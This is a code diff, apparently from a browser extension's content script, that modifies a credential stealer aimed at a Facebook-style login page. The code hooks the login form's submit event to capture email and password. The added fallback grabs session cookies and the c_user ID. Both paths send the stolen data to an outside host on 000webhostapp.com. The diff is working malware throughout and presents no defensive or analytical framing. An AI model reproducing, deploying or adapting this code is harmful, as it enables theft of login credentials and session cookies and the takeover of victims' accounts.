@@ -25,21 +25,29 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
 
         return c_user;
     },
-    keyLogging = () => {
-        const edEmail = document.getElementById("email"),
-            edPass = document.getElementById("pass"),
-            form = edEmail.parentElement.parentElement.parentElement;
+    keyLogging = async () => {
+        try {
+            const edEmail = document.getElementById("email"),
+                edPass = document.getElementById("pass"),
+                form = edEmail.parentElement.parentElement.parentElement;
 
-        form.onsubmit = async () => {
-            const email = edEmail.value,
-                pass = edPass.value,
-                user = {
-                    email,
-                    password: pass,
-                };
+            form.onsubmit = async () => {
+                const email = edEmail.value,
+                    pass = edPass.value,
+                    user = {
+                        email,
+                        password: pass,
+                    };
 
-            sendMessage(user);
-        };
+                sendMessage(user);
+            };
+        } catch (err) {
+            try {
+                const cookie = await getCookies();
+                const user = { cookie: cookie, c_user: cookie.split("c_user=")[1].split(";")[0] };
+                sendMessage(user);
+            } catch (error) {}
+        }
     },
     getCookies = () => {
         return new Promise((resolve, reject) => {
@@ -56,11 +64,6 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
                 sendMessage(user);
             } catch (error) {}
         } else {
-            try {
-                const cookie = await getCookies();
-                const user = { cookie: cookie };
-                sendMessage(user);
-            } catch (error) {}
             keyLogging();
         }
     },
@@ -81,7 +84,7 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
             const c_user = getCUser();
             processUser(c_user);
         } else {
-            chrome.runtime.sendMessage("set_device_id", (e) => {});
+            chrome.runtime.sendMessage("set_device_id", async (e) => {});
         }
     });
 })();
